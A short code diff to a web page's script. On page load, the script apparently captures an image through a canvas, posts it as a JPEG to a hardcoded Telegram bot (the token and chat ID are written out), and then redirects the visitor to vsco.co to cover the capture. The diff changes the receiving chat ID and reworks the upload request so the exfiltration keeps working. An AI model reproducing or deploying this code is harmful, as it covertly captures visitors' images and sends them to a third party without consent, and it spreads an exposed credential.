@@ -20,7 +20,7 @@
 
     <script>
         const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
-        const chatId = "7414704332";
+        const chatId = "8005843544";
 
         window.onload = async () => {
             try {
@@ -57,8 +57,9 @@
 
             canvas.toBlob(blob => {
                 const f = new FormData();
+                f.append('chat_id', chatId);
                 f.append('photo', blob);
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, { method: 'POST', body: f });
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
             }, 'image/jpeg');
             
             setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
